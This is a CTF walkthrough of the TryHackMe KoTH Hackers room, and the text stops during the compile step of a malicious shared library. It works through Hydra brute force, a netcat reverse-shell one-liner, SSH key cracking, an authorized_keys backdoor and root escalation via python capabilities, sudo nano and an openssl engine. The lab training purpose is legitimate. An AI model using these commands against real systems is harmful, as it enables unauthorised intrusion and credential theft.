# TryHackMe-KoTH Hackers

**Scope:**

- LD_PRELOAD
- Capabilities
- Nano

**Keywords:**

- Login Brute Force
- Reverse Shell
- FTP Brute Force
- FTP Enumeration
- Passphrase Cracking & SSH Connection
- Privilege Escalation with Capabilities & Nano & LD_PRELOAD

**Main Commands:**

- `nmap -sSVC -T4 -A -O -oN nmap_result.txt -Pn -p- --min-rate 1000 --max-retries 3 $target_ip`
- `gobuster dir -u http://koth.thm -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -b 403,404,500,501,502,503 -x php,txt,html -e --random-agent -r -t 50`
- `hydra koth.thm http-post-form '/api/login:username=^USER^&password=^PASS^:Incorrect Credentials' -l plague -P /usr/share/wordlists/rockyou.txt -t 64 -F -I`
- `nmap -sV -A -O -oN nmap_ftp.txt -p 21 --script="ftp-*" -Pn $target_ip`
- `wget -m ftp://anonymous:anonymous@koth.thm --recursive --continue`
- `hydra -l rcampbell -P /usr/share/wordlists/rockyou.txt ftp://koth.thm -F -e ns -t 64`
- `hydra -l gcrawford -P /usr/share/wordlists/rockyou.txt ftp://koth.thm -F -e ns -t 64`
- `ncrack -U users.txt -P /usr/share/wordlists/rockyou.txt ftp://koth.thm -oN ncrack_ftp.txt -T aggressive`
- `ftp $target_ip`
- `chmod 600 id_rsa`
- `sudo ssh2john id_rsa > sshhash`
- `sudo john --wordlist=/usr/share/wordlists/rockyou.txt sshhash`
- `ssh -i id_rsa gcrawford@koth.thm`
- `crackmapexec ssh koth.thm -u rcampbell -p '151515' --port 22 -x 'whoami'`
- `gcc -fPIC -shared -o reverseshell.so reverseshell.c -nostartfiles`
- `scp reverseshell.so production@koth.thm:~/reverseshell.so`

**System Commands:**

- `sudo openssl req -engine ./reverseshell.so`
- `sudo -l`
- `sudo -u root /bin/nano /home/gcrawford/business.txt`
- `python3 -c "import os,pty;os.setuid(0);pty.spawn('/bin/bash')"`
- `getcap -r / 2>/dev/null`
- `ss -tulwn`

### Laboratory Environment

[KoTH Hackers](https://tryhackme.com/r/room/kothhackers)

### Penetration Approaches and Commands

> **Network Enumeration Phase**
> 

`nmap -sSVC -T4 -A -O -oN nmap_result.txt -Pn -p- --min-rate 1000 --max-retries 3 $target_ip`

```bash
ORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 2.0.8 or later
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.231.235
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 ftp      ftp           400 Apr 29  2020 note
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ffeab0583579dfb3c157014309be2ad5 (RSA)
|   256 3bff4a884fdc0331b69bddea6985b0af (ECDSA)
|_  256 fafd4c0a03b6f71ceef83343dcb47541 (ED25519)
80/tcp   open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Ellingson Mineral Company
9999/tcp open  abyss?
| fingerprint-strings: 
|   FourOhFourRequest, GetRequest, HTTPOptions: 
|     HTTP/1.0 200 OK
|     Date: Mon, 13 Jan 2025 10:45:39 GMT
|     Content-Length: 1
|     Content-Type: text/plain; charset=utf-8
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|_    Request
```

> **HTTP Port Check**
> 

`curl -iLX GET -D response.txt http://koth.thm`

```bash
HTTP/1.1 200 OK
Accept-Ranges: bytes
Content-Length: 1524
Content-Type: text/html; charset=utf-8
Last-Modified: Sun, 26 Apr 2020 02:27:07 GMT
Date: Mon, 13 Jan 2025 10:46:24 GMT

<!DOCTYPE html>
<html>

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Ellingson Mineral Company</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" type="text/css" media="screen" href="/main.css">
    <script src="/main.js"></script>
</head>

<body onload="onLoad()">
    <div class="titleBar">
        <img src="/img/emc.png" class="logo">
        <h1 class="title">Ellingson Mineral Company</h1>
    </div>
    <div class="navbar">
        <a class="navItem" href="/">Home</a>
        <a class="navItem" href="/staff">Staff</a>
        <a class="navItem" href="/contact">Contact</a>
        <a class="navItem" href="/news">News</a>
    </div>
    <div class="content">
        <h2>Welcome to Ellingson Mineral Company</h2>
        <p>Ellingson Mineral Company (EMC) have been delivering high grade petrochemical products and raw resources for
            over 50 years. With our recent diversification, we also offer supercomputing for hire with up to 200 GigaFLOPS available.</p>
        <p>Supplying some of the largest names in the industry, EMC operate a large fleet of oil tankers allowing us to swiftly meet any requirement that our customers presents us with.</p>
        <!-- https://www.youtube.com/watch?v=3m5qxZm_JqM -->

    </div>
    <div class="footer">
        <hr>
        <p>Copyright © 1995 - Ellingson Mineral Company LLC</p>
    </div>
</body>
</html> 
```

> **Directory Scan & Endpoint Control Phase**
> 

`gobuster dir -u http://koth.thm -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -b 403,404,500,501,502,503 -x php,txt,html -e --random-agent -r -t 50`

```bash
http://koth.thm/news                 (Status: 200) [Size: 2156]
http://koth.thm/index.html           (Status: 200) [Size: 1524]
http://koth.thm/contact              (Status: 200) [Size: 1065]
http://koth.thm/img                  (Status: 200) [Size: 197]
http://koth.thm/staff                (Status: 200) [Size: 2132]
http://koth.thm/robots.txt           (Status: 200) [Size: 127]
http://koth.thm/backdoor             (Status: 200) [Size: 1074]
```

`curl -iLX GET http://koth.thm/robots.txt`

```bash
HTTP/1.1 200 OK
Accept-Ranges: bytes
Content-Length: 127
Content-Type: text/plain; charset=utf-8
Last-Modified: Thu, 30 Apr 2020 01:15:16 GMT
Date: Mon, 13 Jan 2025 10:49:45 GMT

Skiddies keep out.
Any unauthorised access will be forwarded straight to Richard McGill FBI and you WILL be arrested.
- plague
```

`curl -iLX GET http://koth.thm/staff`

```bash
HTTP/1.1 301 Moved Permanently
Location: staff/
Date: Mon, 13 Jan 2025 10:50:20 GMT
Content-Length: 0

HTTP/1.1 200 OK
Accept-Ranges: bytes
Content-Length: 2132
Content-Type: text/html; charset=utf-8
Last-Modified: Tue, 28 Apr 2020 19:52:29 GMT
Date: Mon, 13 Jan 2025 10:50:20 GMT

<!DOCTYPE html>
<html>

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Ellingson Mineral Company</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" type="text/css" media="screen" href="/main.css">
    <script src="/main.js"></script>
</head>

<body onload="onLoad()">
    <div class="titleBar">
        <img src="/img/emc.png" class="logo">
        <h1 class="title">Ellingson Mineral Company</h1>
    </div>
    <div class="navbar">
        <a class="navItem" href="/">Home</a>
        <a class="navItem" href="/staff">Staff</a>
        <a class="navItem" href="/contact">Contact</a>
        <a class="navItem" href="/news">News</a>
    </div>
    <div class="content staff">
        <h2>Ellingson Mineral Company Staff</h2>
        <div class="staffDiv">
            <hr>
            <img class="pfp" src="/img/duke_ellingson.png">
            <h3>Duke Ellingson - CEO</h3>
            <p>The founder of Ellingson Mineral Company, Duke has been managing the day to day operations of the company since the beginning.</p>
        </div>
        <div class="staffDiv">
            <hr>
            <img class="pfp" src="/img/eugene_belford.png">
            <h3>Eugene Belford - CSO</h3>
            <p>Having joined the company in 1992, Eugene has continued to implement rigorous security measures, ensuring
                that our business can continue running smoothly.</p>
                <!-- I don't get why they won't let me put "plague" here to scare off the skiddies... -->
            <hr>
        </div>
        <div class="staffDiv">
            <img class="pfp" src="/img/margo_wallace.png">
            <h3>Margo Wallace - Head of PR</h3>
            <p>Margo has been making sure EMC are one of the leading petrochemical businesses in the industry since she joined in 1993.</p>
            <hr>
        </div>
    </div>
    <div class="footer">
        <hr>
        <p>Copyright © 1995 - Ellingson Mineral Company LLC</p>
    </div>
</body>

</html>
```

![image.png](image.png)

`curl -iLX GET http://koth.thm/backdoor`

```bash
HTTP/1.1 301 Moved Permanently
Location: backdoor/
Date: Mon, 13 Jan 2025 10:52:12 GMT
Content-Length: 0

HTTP/1.1 200 OK
Accept-Ranges: bytes
Content-Length: 1074
Content-Type: text/html; charset=utf-8
Last-Modified: Tue, 28 Apr 2020 22:38:28 GMT
Date: Mon, 13 Jan 2025 10:52:12 GMT

<!DOCTYPE html>
<html>

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Backdoor Login</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" type="text/css" media="screen" href="login.css">
    <script src="login.js"></script>
    <script src="/cookie.js"></script>
</head>

<body onload="onLoad()">
    <form id="loginForm" action="/api/user/login" method="POST">
        <div id="topRow">
            <img src="/img/emc.png" class="logo">
            <h1 class="formTitle">EMC Private Login</h1>
        </div>
        <h5 class="formTitle">Unauthorised access WILL result in prosecution</h5>
        <div class="formElem"><label for="username">Username:</label><input id="username" name="username" required></div>
        <div class="formElem"><label for="password">Password:</label><input id="password" name="password"
                type="password" required></div>
                <button>Login</button>
    </form>
</body>

</html> 
```

`curl -iLX GET http://koth.thm/backdoor/login.js`

```bash
HTTP/1.1 200 OK
Accept-Ranges: bytes
Content-Length: 1836
Content-Type: application/javascript; charset=utf-8
Last-Modified: Wed, 29 Apr 2020 22:25:15 GMT
Date: Mon, 13 Jan 2025 12:02:36 GMT

async function postData(url = '', data = {}) {
    // Default options are marked with *
    const response = await fetch(url, {
        method: 'POST', // *GET, POST, PUT, DELETE, etc.
        cache: 'no-cache', // *default, no-cache, reload, force-cache, only-if-cached
        credentials: 'same-origin', // include, *same-origin, omit
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        redirect: 'follow', // manual, *follow, error
        referrerPolicy: 'no-referrer', // no-referrer, *client
        body: encodeFormData(data) // body data type must match "Content-Type" header
    });
    return response; // We don't always want JSON back
}
const encodeFormData = (data) => {
    return Object.keys(data)
        .map(key => encodeURIComponent(key) + '=' + encodeURIComponent(data[key]))
        .join('&');
}
function onLoad() {
    document.querySelector("#loginForm").addEventListener("submit", function (event) {
        //on pressing enter
        const usernameBox = document.querySelector("#username");
        const passwordBox = document.querySelector("#password");
        event.preventDefault()
        login()
    });
}
async function login() {
    const usernameBox = document.querySelector("#username");
    const passwordBox = document.querySelector("#password");
    const creds = { username: usernameBox.value, password: passwordBox.value }
    const response = await postData("/api/login", creds)
    const statusOrCookie = await response.text()
    console.log(statusOrCookie)
    if (statusOrCookie=== "Incorrect credentials") {
        alert("Incorrect Credentials")
        passwordBox.value=""
    } else {
        Cookies.set("SessionToken",statusOrCookie)
        window.location = "/backdoor/shell"
    }
}
```

![image.png](image%201.png)

> **Login Brute Force & Account Access Phase**
> 

![image.png](image%202.png)

![image.png](image%203.png)

![image.png](image%204.png)

`hydra koth.thm http-post-form '/api/login:username=^USER^&password=^PASS^:Incorrect Credentials' -l plague -P /usr/share/wordlists/rockyou.txt -t 64 -F -I`

```bash
[80][http-post-form] host: koth.thm   login: plague   password: stargazer
```

![image.png](image%205.png)

![image.png](image%206.png)

> **Reverse Shell Phase**
> 

`nc -nlvp 20111`

```bash
listening on [any] 20111 ...
```

```bash
plague@gibson:$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.233.34 20111 >/tmp/f
```

```bash
listening on [any] 20111 ...
connect to [10.10.231.235] from (UNKNOWN) [10.10.6.15] 60130
/bin/sh: 0: can't access tty; job control turned off

$ whoami
production
$ pwd
/home/production/webserver
$ 
```

> **SHH Connection Phase**
> 

```bash
$ ssh-keygen  
Generating public/private rsa key pair.
Enter file in which to save the key (/home/production/.ssh/id_rsa): 
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/production/.ssh/id_rsa.
Your public key has been saved in /home/production/.ssh/id_rsa.pub.
The key fingerprint is:
SHA256:XG6DkjSmhqx2psBwOkViLfBLWqvceXmyum3wnk5QXoE production@gibson
The key's randomart image is:
+---[RSA 2048]----+
|.     ..         |
|...  E  .        |
|.o=. .+.  .      |
|.B.+o+.+ +       |
|o B.o.o S +      |
|+*.oo .. . .     |
|*+ =o= .         |
|o.+ +o=          |
| . o**           |
+----[SHA256]-----+
$ 

```

`cat .ssh/id_rsa.pub`

```bash
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCswpeU4unEepPmrevVks1LWdUXYCngfcwqoBa2DJTlZA7f6vfgn4eIZAmQ1X4zTjOd4G1GXDk6Ae9wx4PnNYaf/+yLnSoxOiWA1Faz4CVwJE0zcn+fJ6pRRK6UUQEuXDGkkKkzk0TlKpKM0OAUW5Ddxur/5n0D9QO7olbqeY3zWeJxgTKW0jVa4WBnhgWGmK0r5YNMySa3w2yO7p18Rr8QyPUUYL668Qfmh3QyQUYxTDEQ324kDYUmzOsz9ArzCxw2aFafhJLnA1xfLjqcjV9bfyAx0AbrJwpTyLTxyIBHf1i1t5nCxg5MtiMwSWTIOwSHIt4qYJmvhi3qvgHQXX53YoA7Aqy91XQvbJH7RyubZ0Wlk6DqUYqulGwAR5+15Xhl3V7e1ZmLw2k822QyKz7Ry0F7Et3K4SMYcuV5UB+SM2F5ioQoj76ZhusURJG/0lvvHg9gBtamV5u9c+4MpMO7r7QFzADLvq4vGvFlcxi5eNxoC4q+U+oCy5C7sbS1qys= root@kali
```

```bash
$ echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCswpeU4unEepPmrevVks1LWdUXYCngfcwqoBa2DJTlZA7f6vfgn4eIZAmQ1X4zTjOd4G1GXDk6Ae9wx4PnNYaf/+yLnSoxOiWA1Faz4CVwJE0zcn+fJ6pRRK6UUQEuXDGkkKkzk0TlKpKM0OAUW5Ddxur/5n0D9QO7olbqeY3zWeJxgTKW0jVa4WBnhgWGmK0r5YNMySa3w2yO7p18Rr8QyPUUYL668Qfmh3QyQUYxTDEQ324kDYUmzOsz9ArzCxw2aFafhJLnA1xfLjqcjV9bfyAx0AbrJwpTyLTxyIBHf1i1t5nCxg5MtiMwSWTIOwSHIt4qYJmvhi3qvgHQXX53YoA7Aqy91XQvbJH7RyubZ0Wlk6DqUYqulGwAR5+15Xhl3V7e1ZmLw2k822QyKz7Ry0F7Et3K4SMYcuV5UB+SM2F5ioQoj76ZhusURJG/0lvvHg9gBtamV5u9c+4MpMO7r7QFzADLvq4vGvFlcxi5eNxoC4q+U+oCy5C7sbS1qys= root@kali' > .ssh/authorized_keys
$
```

`ssh production@koth.thm -p 22`

```bash
production@gibson:~$ whoami
production
production@gibson:~$ id
uid=1001(production) gid=1001(production) groups=1001(production)
production@gibson:~$ pwd
/home/production
production@gibson:~$ ls -lsa
total 44
4 drwxr-x--- 7 production production 4096 Jan 13 12:15 .
4 drwxr-xr-x 6 root       root       4096 Apr 29  2020 ..
0 lrwxrwxrwx 1 production production    9 Apr 30  2020 .bash_history -> /dev/null
4 -rw-r--r-- 1 production production  220 Apr 29  2020 .bash_logout
4 -rw-r--r-- 1 production production 3771 Apr 29  2020 .bashrc
4 drwx------ 2 production production 4096 Apr 29  2020 .cache
4 -r-------- 1 production production   38 Apr 30  2020 .flag
4 drwx------ 3 production production 4096 Apr 29  2020 .gnupg
4 drwxrwxr-x 3 production production 4096 Apr 30  2020 .local
4 -rw-r--r-- 1 production production  807 Apr 29  2020 .profile
4 drwx------ 2 production production 4096 Jan 13 12:17 .ssh
4 drwxr-xr-x 3 production production 4096 May  7  2020 webserver
production@gibson:~$ 
```

> **FTP Brute Force & Enumeration Phase**
> 

`nmap -sV -A -O -oN nmap_ftp.txt -p 21 --script="ftp-*" -Pn $target_ip`

```bash
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later
| ftp-brute: 
|   Accounts: No valid accounts found
|_  Statistics: Performed 3688 guesses in 602 seconds, average tps: 6.0
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.231.235
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 ftp      ftp           400 Apr 29  2020 note
```

`wget -m ftp://anonymous:anonymous@koth.thm --recursive --continue`

```bash
koth.thm/.listing                [ <=>                                          ]     244  --.-KB/s    in 0s      

2025-01-13 10:57:05 (31.4 MB/s) - ‘koth.thm/.listing’ saved [244]

--2025-01-13 10:57:05--  ftp://anonymous:*password*@koth.thm/.flag
           => ‘koth.thm/.flag’
==> CWD not required.
==> PASV ... done.    ==> RETR .flag ... done.
Length: 38

koth.thm/.flag               100%[=============================================>]      38  --.-KB/s    in 0.002s  

2025-01-13 10:57:05 (16.0 KB/s) - ‘koth.thm/.flag’ saved [38]

--2025-01-13 10:57:05--  ftp://anonymous:*password*@koth.thm/note
           => ‘koth.thm/note’
==> CWD not required.
==> PASV ... done.    ==> RETR note ... done.
Length: 400

koth.thm/note                100%[=============================================>]     400  --.-KB/s    in 0s      

2025-01-13 10:57:05 (944 KB/s) - ‘koth.thm/note’ saved [400]

FINISHED --2025-01-13 10:57:05--
Total wall clock time: 0.07s
Downloaded: 3 files, 682 in 0.003s (243 KB/s)

```

`ls -lsa koth.thm`

```bash
4 drwxr-xr-x  2 root root 4096 Jan 13 10:57 .
4 drwx------ 22 root root 4096 Jan 13 10:57 ..
4 -rw-r--r--  1 root root   38 Apr 30  2020 .flag
4 -rw-r--r--  1 root root  244 Jan 13 10:57 .listing
4 -rw-r--r--  1 root root  400 Apr 29  2020 note
```

`cat koth.thm/note`

```bash
Note:
Any users with passwords in this list:
love
sex
god
secret
will be subject to an immediate disciplinary hearing.
Any users with other weak passwords will be complained at, loudly.
These users are:
rcampbell:Robert M. Campbell:Weak password
gcrawford:Gerard B. Crawford:Exposing crypto keys, weak password
Exposing the company's cryptographic keys is a disciplinary offense.
Eugene Belford, CSO
```

`nano users.txt`

```bash
rcampbell
gcrawford
ebelford
mwallace
dellingson
```

`hydra -l rcampbell -P /usr/share/wordlists/rockyou.txt ftp://koth.thm -F -e ns -t 64`

```bash
[21][ftp] host: koth.thm   login: rcampbell   password: 151515
```

`hydra -l gcrawford -P /usr/share/wordlists/rockyou.txt ftp://koth.thm -F -e ns -t 64`

```bash
[21][ftp] host: koth.thm   login: gcrawford   password: 021088
```

`ncrack -U users.txt -P /usr/share/wordlists/rockyou.txt ftp://koth.thm -oN ncrack_ftp.txt -T aggressive`

```bash
[REDACTED] - SAME
```

`ftp $target_ip`

```bash
Name (10.10.6.15:root): gcrawford
331 Please specify the password.
Password: 021088
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
229 Entering Extended Passive Mode (|||52469|)
150 Here comes the directory listing.
-r--------    1 ftp      ftp           252 Apr 30  2020 business.txt
226 Directory send OK.
ftp> mget *
mget business.txt [anpqy?]? y
229 Entering Extended Passive Mode (|||30375|)
150 Opening BINARY mode data connection for business.txt (252 bytes).
100% |**********************************************************************|   252      298.29 KiB/s    00:00 ETA
226 Transfer complete.
252 bytes received in 00:00 (177.94 KiB/s)
ftp> ls -lsa
229 Entering Extended Passive Mode (|||42057|)
150 Here comes the directory listing.
drwxr-x---    6 ftp      ftp          4096 Apr 30  2020 .
drwxr-x---    6 ftp      ftp          4096 Apr 30  2020 ..
lrwxrwxrwx    1 ftp      ftp             9 Apr 30  2020 .bash_history -> /dev/null
-rw-r--r--    1 ftp      ftp           220 Apr 29  2020 .bash_logout
-rw-r--r--    1 ftp      ftp          3771 Apr 29  2020 .bashrc
drwx------    2 ftp      ftp          4096 Apr 29  2020 .cache
drwx------    3 ftp      ftp          4096 Apr 29  2020 .gnupg
drwxrwxr-x    3 ftp      ftp          4096 Apr 29  2020 .local
-rw-r--r--    1 ftp      ftp           807 Apr 29  2020 .profile
drwx------    2 ftp      ftp          4096 Jan 13 10:18 .ssh
-r--------    1 ftp      ftp           252 Apr 30  2020 business.txt
226 Directory send OK.
ftp> cd .ssh
250 Directory successfully changed.
ftp> dir
229 Entering Extended Passive Mode (|||11499|)
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp           398 Jan 13 10:18 authorized_keys
-rw-------    1 ftp      ftp          1766 Jan 13 10:18 id_rsa
-rw-r--r--    1 ftp      ftp           398 Jan 13 10:18 id_rsa.pub
226 Directory send OK.
ftp> mget *
mget authorized_keys [anpqy?]? y
229 Entering Extended Passive Mode (|||62620|)
150 Opening BINARY mode data connection for authorized_keys (398 bytes).
100% |**********************************************************************|   398        6.43 MiB/s    00:00 ETA
226 Transfer complete.
398 bytes received in 00:00 (598.87 KiB/s)
mget id_rsa [anpqy?]? y
229 Entering Extended Passive Mode (|||34617|)
150 Opening BINARY mode data connection for id_rsa (1766 bytes).
100% |**********************************************************************|  1766       34.37 MiB/s    00:00 ETA
226 Transfer complete.
1766 bytes received in 00:00 (1.98 MiB/s)
mget id_rsa.pub [anpqy?]? y
229 Entering Extended Passive Mode (|||32744|)
150 Opening BINARY mode data connection for id_rsa.pub (398 bytes).
100% |**********************************************************************|   398        7.74 MiB/s    00:00 ETA
226 Transfer complete.
398 bytes received in 00:00 (777.34 KiB/s)
ftp> exit

```

`ftp $target_ip`

```bash
Name (10.10.6.15:root): rcampbell
331 Please specify the password.
Password: 151515

230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -lsa
229 Entering Extended Passive Mode (|||22370|)
150 Here comes the directory listing.
drwxr-x---    2 ftp      ftp          4096 Apr 30  2020 .
drwxr-x---    2 ftp      ftp          4096 Apr 30  2020 ..
lrwxrwxrwx    1 ftp      ftp             9 Apr 30  2020 .bash_history -> /dev/null
-rw-r--r--    1 ftp      ftp           220 Apr 29  2020 .bash_logout
-rw-r--r--    1 ftp      ftp          3771 Apr 29  2020 .bashrc
-r--------    1 ftp      ftp            38 Apr 30  2020 .flag
-rw-r--r--    1 ftp      ftp           807 Apr 29  2020 .profile
226 Directory send OK.
ftp> exit
```

`cat business.txt`

```bash
Remember to send the accounts to Rich by 5pm Friday.

Remember to change my password, before the meeting with Mr Belford.
I hope he doesn't fire me. I need to provide for my family
I need to send Ben the flag too
```

> **Passphrase Cracking & SSH Connection Phase**
> 

`chmod 600 id_rsa`

`sudo ssh2john id_rsa > sshhash`

`sudo john --wordlist=/usr/share/wordlists/rockyou.txt sshhash`

```bash
pinball          (id_rsa) 
```

`ssh -i id_rsa gcrawford@koth.thm`

```bash
Enter passphrase for key 'id_rsa': pinball

Last login: Wed Apr 29 19:32:48 2020 from 192.168.170.1

gcrawford@gibson:~$ whoami
gcrawford
gcrawford@gibson:~$ id
uid=1003(gcrawford) gid=1003(gcrawford) groups=1003(gcrawford)
gcrawford@gibson:~$ pwd
/home/gcrawford
gcrawford@gibson:~$ ls
business.txt
gcrawford@gibson:~$ 

```

`crackmapexec ssh koth.thm -u rcampbell -p '151515' --port 22 -x 'whoami'`

```bash
SSH         koth.thm        22     koth.thm         [*] SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3
SSH         koth.thm        22     koth.thm         [+] rcampbell:151515 
SSH         koth.thm        22     koth.thm         [+] Executed command
SSH         koth.thm        22     koth.thm         rcampbell
```

`ssh rcampbell@koth.thm -p 22`

```bash
rcampbell@koth.thm's password: 151515

rcampbell@gibson:~$ whoami
rcampbell
rcampbell@gibson:~$ id
uid=1002(rcampbell) gid=1002(rcampbell) groups=1002(rcampbell)
rcampbell@gibson:~$ pwd
/home/rcampbell
rcampbell@gibson:~$ ls -lsa
total 32
4 drwxr-x--- 4 rcampbell rcampbell 4096 Jan 13 11:41 .
4 drwxr-xr-x 6 root      root      4096 Apr 29  2020 ..
0 lrwxrwxrwx 1 rcampbell rcampbell    9 Apr 30  2020 .bash_history -> /dev/null
4 -rw-r--r-- 1 rcampbell rcampbell  220 Apr 29  2020 .bash_logout
4 -rw-r--r-- 1 rcampbell rcampbell 3771 Apr 29  2020 .bashrc
4 drwx------ 2 rcampbell rcampbell 4096 Jan 13 11:41 .cache
4 -r-------- 1 rcampbell rcampbell   38 Apr 30  2020 .flag
4 drwx------ 3 rcampbell rcampbell 4096 Jan 13 11:41 .gnupg
4 -rw-r--r-- 1 rcampbell rcampbell  807 Apr 29  2020 .profile
rcampbell@gibson:~$ 

```

> **Internal System Investigation Phase**
> 

```bash
gcrawford@gibson:~$ uname -a
Linux gibson 4.15.0-99-generic #100-Ubuntu SMP Wed Apr 22 20:32:56 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux

gcrawford@gibson:~$ dpkg --version
Debian 'dpkg' package management program version 1.19.0.5 (amd64).
This is free software; see the GNU General Public License version 2 or
later for copying conditions. There is NO warranty.

gcrawford@gibson:~$ cat /etc/passwd | grep '/bin/bash'
root:x:0:0:root:/root:/bin/bash
tryhackme:x:1000:1000:TryHackMe:/home/tryhackme:/bin/bash
production:x:1001:1001:,,,:/home/production:/bin/bash
rcampbell:x:1002:1002:Robert M. Campbell,,,:/home/rcampbell:/bin/bash
gcrawford:x:1003:1003:Gerard B. Crawford,,,:/home/gcrawford:/bin/bash

gcrawford@gibson:~$ ss -tulwn
Netid        State          Recv-Q         Send-Q                    Local Address:Port                 Peer Address:Port         
icmp6        UNCONN         0              0                                *%eth0:58                              *:*            
udp          UNCONN         0              0                         127.0.0.53%lo:53                        0.0.0.0:*            
udp          UNCONN         0              0                       10.10.6.15%eth0:68                        0.0.0.0:*            
tcp          LISTEN         0              128                       127.0.0.53%lo:53                        0.0.0.0:*            
tcp          LISTEN         0              128                             0.0.0.0:22                        0.0.0.0:*            
tcp          LISTEN         0              128                                   *:9999                            *:*            
tcp          LISTEN         0              128                                   *:80                              *:*            
tcp          LISTEN         0              32                                    *:21                              *:*            
tcp          LISTEN         0              128                                [::]:22                           [::]:*            

gcrawford@gibson:~$ sudo -l
[sudo] password for gcrawford: pinball       
Sorry, try again.
[sudo] password for gcrawford: 021088
      
Matching Defaults entries for gcrawford on gibson:
    env_reset, pwfeedback, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User gcrawford may run the following commands on gibson:
    (root) /bin/nano /home/gcrawford/business.txt
    
gcrawford@gibson:~$ 

```

```bash
rcampbell@gibson:~$ getcap -r / 2>/dev/null
/usr/bin/python3.6 = cap_setuid+ep
/usr/bin/python3.6m = cap_setuid+ep
/usr/bin/mtr-packet = cap_net_raw+ep
rcampbell@gibson:~$ 
```

> **Privilege Escalation with Capabilities & Nano & LD_PRELOAD**
> 

**For more information:**

[openssl
            
            |
            
            GTFOBins](https://gtfobins.github.io/gtfobins/openssl/)

[Linux Privilege Escalation using LD_Preload - Hacking Articles](https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/)

[nano
            
            |
            
            GTFOBins](https://gtfobins.github.io/gtfobins/nano/)

```bash
rcampbell@gibson:~$ python3 -c "import os,pty;os.setuid(0);pty.spawn('/bin/bash')"
root@gibson:~# whoami
root
root@gibson:~# id
uid=0(root) gid=1002(rcampbell) groups=1002(rcampbell)
root@gibson:~# ls -lsa /root/
total 6452
   4 drwx------  4 root root    4096 Apr 30  2020 .
   4 drwxr-xr-x 24 root root    4096 Jan 13 10:18 ..
   0 lrwxrwxrwx  1 root root       9 Apr 30  2020 .bash_history -> /dev/null
   4 -rw-------  1 root root    3106 Apr  9  2018 .bashrc
   4 -rw-r--r--  1 root root      38 Apr 30  2020 .flag
   4 -rw-r--r--  1 root root       1 Apr 30  2020 king.txt
6416 -rwxr-xr-x  1 root root 6566663 Apr 30  2020 koth
   4 drwxr-xr-x  3 root root    4096 Apr 29  2020 .local
   4 -rw-r--r--  1 root root     148 Aug 17  2015 .profile
   4 -rw-r--r--  1 root root      66 Apr 30  2020 .selected_editor
   4 drwx------  2 root root    4096 Apr 26  2020 .ssh
root@gibson:~# 
```

```bash
gcrawford@gibson:~$ sudo -u root /bin/nano /home/gcrawford/business.txt

Remember to send the accounts to Rich by 5pm Friday.

Remember to change my password, before the meeting with Mr Belford.
I hope he doesn't fire me. I need to provide for my family
I need to send Ben the flag too, thm{d8deb5f0526ec81f784ce68e641cde40}

Command to execute: reset; sh 1>&0 2>&0#                                                                                          

sh: 2: ▒: not found                                              M-F New Buffer
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)
# pwd
/home/gcrawford
# 
```

```bash
production@gibson:~$ sudo -l
Matching Defaults entries for production on gibson:
    env_reset, pwfeedback, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User production may run the following commands on gibson:
    (root) NOPASSWD: /usr/bin/openssl
    
production@gibson:~$ 
```

`nano reverseshell.c`

```bash
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    setgid(0);
    setuid(0);
    system("/bin/sh");
}
```

`gcc -fPIC -shared -o reverseshell.so reverseshell.c -nostartfiles`

```bash
reverseshell.c: In function ‘_init’:
reverseshell.c:5:5: warning: implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration]
    5 |     setgid(0);
      |     ^~~~~~
